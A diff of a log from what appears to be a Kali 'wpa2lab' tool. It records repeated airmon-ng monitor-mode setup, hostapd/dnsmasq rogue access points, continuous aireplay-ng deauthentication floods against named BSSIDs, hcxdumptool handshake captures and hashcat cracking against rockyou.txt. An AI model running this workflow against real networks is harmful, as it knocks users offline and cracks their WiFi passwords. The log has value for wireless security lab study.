@@ -141,3 +141,1029 @@
 2025-04-29 18:18:15,260 INFO Ejecutando: hcxpcapngtool -o /home/kali/wpa2lab/hash.22000 /home/kali/wpa2lab/dump.pcapng
 2025-04-29 18:18:31,142 INFO Ejecutando: hashcat -m 22000 /home/kali/wpa2lab/hash.22000 /usr/share/wordlists/rockyou.txt
 2025-04-29 18:19:44,072 INFO Ejecutando: hashcat -m 22000 /home/kali/wpa2lab/hash.22000 /usr/share/wordlists/rockyou.txt
+2025-05-03 19:57:59,016 INFO sudo ip link set wlan0 up
+2025-05-03 19:57:59,033 INFO sudo ip addr flush dev wlan0
+2025-05-03 19:57:59,052 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-03 19:57:59,130 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-03 19:57:59,536 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-03 20:09:50,684 INFO sudo airmon-ng check kill
+2025-05-03 20:09:50,939 INFO sudo airmon-ng start wlan1
+2025-05-03 20:16:52,141 INFO sudo airmon-ng check kill
+2025-05-03 20:16:52,387 INFO sudo airmon-ng start wlan1
+2025-05-03 20:18:51,302 INFO sudo ip link set wlan0 up
+2025-05-03 20:18:51,316 INFO sudo ip addr flush dev wlan0
+2025-05-03 20:18:51,335 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-03 20:18:51,397 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-03 20:18:51,515 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-03 20:19:08,801 INFO sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:87 -w dump.pcapng
+2025-05-04 08:27:53,071 INFO sudo ip link set wlan1 up
+2025-05-04 08:27:53,095 INFO sudo ip addr flush dev wlan1
+2025-05-04 08:27:53,107 INFO sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 08:27:54,176 INFO sudo hostapd -B /tmp/hostapd_wlan1.conf
+2025-05-04 08:27:55,060 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan1.conf
+2025-05-04 08:30:13,499 INFO sudo airmon-ng check kill
+2025-05-04 08:30:13,749 INFO sudo airmon-ng start wlan0
+2025-05-04 08:34:12,679 INFO sudo ip link set wlan1 up
+2025-05-04 08:34:12,694 INFO sudo ip addr flush dev wlan1
+2025-05-04 08:34:12,710 INFO sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 08:34:12,766 INFO sudo hostapd -B /tmp/hostapd_wlan1.conf
+2025-05-04 08:34:13,026 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan1.conf
+2025-05-04 08:37:04,229 INFO sudo ip link set wlan1 up
+2025-05-04 08:37:04,243 INFO sudo ip addr flush dev wlan1
+2025-05-04 08:37:04,259 INFO sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 08:37:04,321 INFO sudo hostapd -B /tmp/hostapd_wlan1.conf
+2025-05-04 08:37:04,686 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan1.conf
+2025-05-04 08:37:52,810 INFO sudo ip link set wlan1 up
+2025-05-04 08:37:52,826 INFO sudo ip addr flush dev wlan1
+2025-05-04 08:37:52,843 INFO sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 08:37:52,907 INFO sudo hostapd -B /tmp/hostapd_wlan1.conf
+2025-05-04 08:37:53,202 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan1.conf
+2025-05-04 08:39:28,825 INFO sudo ip link set wlan1 up
+2025-05-04 08:39:28,839 INFO sudo ip addr flush dev wlan1
+2025-05-04 08:39:28,855 INFO sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 08:39:28,917 INFO sudo hostapd -B /tmp/hostapd_wlan1.conf
+2025-05-04 08:39:29,207 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan1.conf
+2025-05-04 16:52:07,548 INFO CMD: sudo airmon-ng check kill
+2025-05-04 16:57:37,759 INFO CMD sudo airmon-ng check kill
+2025-05-04 16:57:37,980 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 16:58:15,215 INFO CMD sudo aireplay-ng --deauth 0 -a 98:97:D1:7D:52:1F wlan1mon
+2025-05-04 17:18:31,404 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:18:31,624 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 17:25:45,707 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 17:25:46,947 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 17:26:44,116 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:26:44,341 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 17:26:52,418 INFO CMD sudo ip link set wlan1 up
+2025-05-04 17:26:52,566 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 17:26:52,586 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 17:26:52,629 INFO CMD sudo hostapd -B /tmp/tmpk8q5no4_.conf
+2025-05-04 17:26:53,226 INFO CMD sudo dnsmasq -C /tmp/tmpmng5zhsp.conf
+2025-05-04 17:35:37,164 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:35:37,427 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 17:35:44,925 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 17:35:46,199 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 17:38:23,659 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:38:23,885 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 17:38:33,602 INFO CMD sudo ip link set wlan1 up
+2025-05-04 17:38:33,763 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 17:38:33,782 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 17:38:33,838 INFO CMD sudo hostapd -B /tmp/tmp_w1r0moh
+2025-05-04 17:38:34,265 INFO CMD sudo dnsmasq -C /tmp/tmplbk52igr
+2025-05-04 17:49:23,718 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:49:23,976 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 17:49:28,780 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 17:49:30,035 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 17:49:34,494 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:49:34,717 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 17:49:38,915 INFO CMD sudo ip link set wlan1 up
+2025-05-04 17:49:39,065 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 17:49:39,084 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 17:49:39,138 INFO CMD sudo hostapd -B /tmp/tmpkx84us6u
+2025-05-04 17:49:39,580 INFO CMD sudo dnsmasq -C /tmp/tmptk3_vlor
+2025-05-04 17:51:53,635 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:51:53,900 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 17:54:11,079 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 17:54:12,363 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 17:54:19,068 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:54:19,296 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 17:55:49,862 INFO CMD sudo ip link set wlan1 up
+2025-05-04 17:55:50,070 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 17:55:50,089 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 17:55:50,147 INFO CMD sudo hostapd -B /tmp/tmp2mczbctj
+2025-05-04 17:55:50,580 INFO CMD sudo dnsmasq -C /tmp/tmprqo45_yo
+2025-05-04 17:55:55,316 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 17:56:00,556 INFO CMD sudo airmon-ng check kill
+2025-05-04 17:56:00,822 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:00:02,170 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:00:05,744 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:00:05,972 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:13:46,056 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:14:03,142 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:14:03,372 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:14:32,242 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:14:32,472 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:15:01,343 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:15:02,616 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:15:09,119 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:15:09,351 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:21:18,168 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:21:21,551 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:21:21,779 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:26:27,940 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:26:34,018 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:26:34,241 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:27:13,928 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:27:14,156 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:29:07,387 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:29:08,632 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:29:11,375 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:29:11,597 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:30:08,376 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:30:12,031 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:30:12,264 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:32:29,843 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:32:30,069 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:34:45,723 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:34:47,000 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:34:51,189 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:34:51,409 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:38:10,037 INFO CMD sudo ip link set wlan0 up
+2025-05-04 18:38:10,250 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 18:38:10,270 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 18:38:10,328 INFO CMD sudo hostapd -B /tmp/tmpzo28_2qk
+2025-05-04 18:38:10,636 INFO CMD sudo dnsmasq -C /tmp/tmpsv9lm73_
+2025-05-04 18:44:36,688 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:44:39,760 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:44:40,013 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:44:45,732 INFO CMD sudo ip link set wlan0 up
+2025-05-04 18:44:45,753 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 18:44:45,772 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 18:44:45,832 INFO CMD sudo hostapd -B /tmp/tmpizw0x460
+2025-05-04 18:44:45,935 INFO CMD sudo dnsmasq -C /tmp/tmpgvjmlunb
+2025-05-04 18:45:24,334 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:45:31,479 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:45:31,738 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:45:35,501 INFO CMD sudo ip link set wlan0 up
+2025-05-04 18:45:35,519 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 18:45:35,537 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 18:45:35,589 INFO CMD sudo hostapd -B /tmp/tmp4k0cp1ya
+2025-05-04 18:45:35,732 INFO CMD sudo dnsmasq -C /tmp/tmpsue7syln
+2025-05-04 18:55:23,367 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:55:26,574 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:55:26,828 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 18:55:30,355 INFO CMD sudo ip link set wlan0 up
+2025-05-04 18:55:30,375 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 18:55:30,394 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 18:55:30,453 INFO CMD sudo hostapd -B /tmp/tmpgsvaha57
+2025-05-04 18:55:30,556 INFO CMD sudo dnsmasq -C /tmp/tmpnbviv9de
+2025-05-04 18:56:20,082 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:56:20,336 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 18:57:00,223 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 18:57:01,492 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 18:57:17,103 INFO CMD sudo airmon-ng check kill
+2025-05-04 18:57:17,327 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:05:34,075 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:05:34,305 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 19:07:57,167 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:07:58,452 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 19:08:01,784 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:08:02,014 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:15:44,944 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:15:45,170 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 19:18:16,206 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:18:17,451 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 19:18:20,148 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:18:20,377 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:22:15,082 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:22:15,308 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 19:22:38,046 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:22:39,328 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 19:22:41,897 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:22:42,114 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:46:33,001 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:46:36,606 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:46:36,830 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 19:47:35,797 INFO CMD sudo ip link set wlan1 up
+2025-05-04 19:47:35,942 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 19:47:35,960 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 19:47:36,016 INFO CMD sudo hostapd -B /tmp/tmp73vrl2im
+2025-05-04 19:47:36,464 INFO CMD sudo dnsmasq -C /tmp/tmpb2fiatgb
+2025-05-04 19:48:32,859 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 19:48:35,645 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:48:35,893 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:48:39,479 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:48:39,687 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:48:39,703 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:48:39,764 INFO CMD sudo hostapd -B /tmp/tmpdy5y2mxg
+2025-05-04 19:48:40,069 INFO CMD sudo dnsmasq -C /tmp/tmpd8c8o5g_
+2025-05-04 19:51:25,963 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:51:26,218 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 19:51:31,729 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:51:32,982 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 19:51:35,386 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:51:35,613 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:51:38,447 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:51:38,656 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:51:38,675 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:51:38,731 INFO CMD sudo hostapd -B /tmp/tmpg1ydlp4z
+2025-05-04 19:51:39,059 INFO CMD sudo dnsmasq -C /tmp/tmp09anhdzd
+2025-05-04 19:54:08,002 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:54:10,838 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:54:11,090 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:54:14,810 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:54:14,829 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:54:14,847 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:54:14,902 INFO CMD sudo hostapd -B /tmp/tmp_jxrczpp
+2025-05-04 19:54:14,987 INFO CMD sudo dnsmasq -C /tmp/tmpobdc0zck
+2025-05-04 19:55:12,727 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:55:15,451 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:55:15,710 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:55:20,228 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:55:20,246 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:55:20,265 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:55:20,325 INFO CMD sudo hostapd -B /tmp/tmpynmyhdp8
+2025-05-04 19:55:20,412 INFO CMD sudo dnsmasq -C /tmp/tmpuafaf5o9
+2025-05-04 19:57:55,758 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:57:58,714 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:57:58,953 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:58:03,077 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:58:03,091 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:58:03,104 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:58:03,160 INFO CMD sudo hostapd -B /tmp/tmpc2ovwawv
+2025-05-04 19:58:03,253 INFO CMD sudo dnsmasq -C /tmp/tmphj0_6p0e
+2025-05-04 19:58:23,081 INFO CMD sudo aireplay-ng --deauth 0 -a 70:D8:23:2B:52:88 wlan1mon
+2025-05-04 19:58:59,474 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 19:59:03,035 INFO CMD sudo airmon-ng check kill
+2025-05-04 19:59:03,290 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 19:59:07,602 INFO CMD sudo ip link set wlan0 up
+2025-05-04 19:59:07,620 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 19:59:07,637 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 19:59:07,695 INFO CMD sudo hostapd -B /tmp/tmpeovoj9dx
+2025-05-04 19:59:07,795 INFO CMD sudo dnsmasq -C /tmp/tmplvrdg2_8
+2025-05-04 20:01:46,089 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:01:48,826 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:01:49,070 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:01:52,528 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:01:52,545 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:01:52,562 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:01:52,620 INFO CMD sudo hostapd -B /tmp/tmp8i9y0n_u
+2025-05-04 20:01:52,731 INFO CMD sudo dnsmasq -C /tmp/tmpban4b1t_
+2025-05-04 20:04:50,432 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:04:53,172 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:04:53,406 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:04:56,799 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:04:56,818 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:04:56,836 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:04:56,897 INFO CMD sudo hostapd -B /tmp/tmppy674_u9
+2025-05-04 20:04:57,014 INFO CMD sudo dnsmasq -C /tmp/tmp1n65yju9
+2025-05-04 20:06:42,635 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:06:45,417 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:06:45,675 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:12:31,946 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:12:34,445 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:12:34,673 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:12:38,138 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:12:38,159 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:12:38,178 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:12:38,236 INFO CMD sudo hostapd -B /tmp/tmplr9sl_1l
+2025-05-04 20:12:38,354 INFO CMD sudo dnsmasq -C /tmp/tmpyp1cq5rz
+2025-05-04 20:14:31,792 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:14:38,870 INFO CMD sudo ip link set wlan1 up
+2025-05-04 20:14:39,020 INFO CMD sudo ip addr flush dev wlan1
+2025-05-04 20:14:39,036 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-04 20:14:39,739 INFO CMD sudo hostapd -B /tmp/tmpixrv_svg
+2025-05-04 20:14:40,172 INFO CMD sudo dnsmasq -C /tmp/tmp44ibo4ky
+2025-05-04 20:14:41,672 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:14:41,932 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:15:31,208 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:15:35,752 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:15:35,994 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:15:40,001 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:15:40,019 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:15:40,036 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:15:40,096 INFO CMD sudo hostapd -B /tmp/tmpsgsdbdyc
+2025-05-04 20:15:40,187 INFO CMD sudo dnsmasq -C /tmp/tmpw9zo_ki7
+2025-05-04 20:15:53,297 INFO CMD sudo aireplay-ng --deauth 0 -a 70:D8:23:2B:52:88 wlan1mon
+2025-05-04 20:17:10,866 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:17:14,782 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:17:15,046 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:17:18,303 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:17:18,321 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:17:18,337 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:17:18,392 INFO CMD sudo hostapd -B /tmp/tmpvdn6om7k
+2025-05-04 20:17:18,470 INFO CMD sudo dnsmasq -C /tmp/tmp6otazfl5
+2025-05-04 20:17:33,228 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:17:33,250 INFO CMD sudo aireplay-ng --deauth 0 -a 70:D8:23:2B:52:88 wlan1mon
+2025-05-04 20:17:47,799 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:17:47,818 INFO CMD sudo aireplay-ng --deauth 0 -a 70:D8:23:2B:52:88 wlan1mon
+2025-05-04 20:18:28,047 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:19:12,322 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:19:12,585 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:19:16,522 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:19:16,544 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:19:16,563 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:19:16,619 INFO CMD sudo hostapd -B /tmp/tmp9z7q__w6
+2025-05-04 20:19:16,761 INFO CMD sudo dnsmasq -C /tmp/tmpj18bny0b
+2025-05-04 20:19:51,470 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:19:53,930 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:19:54,184 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:19:57,650 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:19:57,667 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:19:57,684 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:19:57,741 INFO CMD sudo hostapd -B /tmp/tmpnrxsjn2_
+2025-05-04 20:19:57,819 INFO CMD sudo dnsmasq -C /tmp/tmpflpjuhrt
+2025-05-04 20:20:36,371 INFO sudo ip link set wlan0 up
+2025-05-04 20:20:36,388 INFO sudo ip addr flush dev wlan0
+2025-05-04 20:20:36,403 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:20:37,130 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-04 20:20:37,278 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-04 20:26:34,949 INFO sudo ip link set wlan0 up
+2025-05-04 20:26:34,966 INFO sudo ip addr flush dev wlan0
+2025-05-04 20:26:34,984 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:26:35,046 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-04 20:26:35,864 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-04 20:26:48,671 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:26:51,542 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:26:51,768 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:26:54,774 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:26:54,792 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:26:54,810 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:26:54,866 INFO CMD sudo hostapd -B /tmp/tmpe0u96bjm
+2025-05-04 20:26:54,994 INFO CMD sudo dnsmasq -C /tmp/tmpckdimcwj
+2025-05-04 20:27:37,906 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:27:38,065 INFO CMD sudo aireplay-ng --deauth 0 -a 70:D8:23:2B:52:88 wlan1mon
+2025-05-04 20:28:04,029 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:28:04,281 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 20:28:11,845 INFO CMD sudo hcxdumptool -i wlan0mon -c  -t  -o /home/kali/wpa2lab/dump.pcapng
+2025-05-04 20:31:23,798 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:31:25,075 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 20:31:28,163 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:31:28,385 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:31:31,136 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:31:31,341 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:31:31,359 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:31:31,413 INFO CMD sudo hostapd -B /tmp/tmpoxdefcg_
+2025-05-04 20:31:31,729 INFO CMD sudo dnsmasq -C /tmp/tmpyjelmeo1
+2025-05-04 20:31:37,201 INFO CMD sudo iw dev wlan1mon set channel 
+2025-05-04 20:33:48,917 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:33:49,187 INFO CMD sudo airmon-ng start wlan0
+2025-05-04 20:34:13,459 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:34:14,749 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-04 20:34:18,233 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:34:18,466 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:34:23,188 INFO CMD sudo ip link set wlan0 up
+2025-05-04 20:34:23,401 INFO CMD sudo ip addr flush dev wlan0
+2025-05-04 20:34:23,420 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-04 20:34:23,473 INFO CMD sudo hostapd -B /tmp/tmpd_odz2a5
+2025-05-04 20:34:23,797 INFO CMD sudo dnsmasq -C /tmp/tmp0e7q878h
+2025-05-04 20:34:43,205 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-04 20:34:43,360 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -o /home/kali/wpa2lab/captures/dump-20250504_203443.pcapng
+2025-05-04 20:37:36,241 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-04 20:37:38,525 INFO CMD sudo airmon-ng check kill
+2025-05-04 20:37:38,790 INFO CMD sudo airmon-ng start wlan1
+2025-05-04 20:37:43,826 INFO CMD sudo ip link set wlan0 up
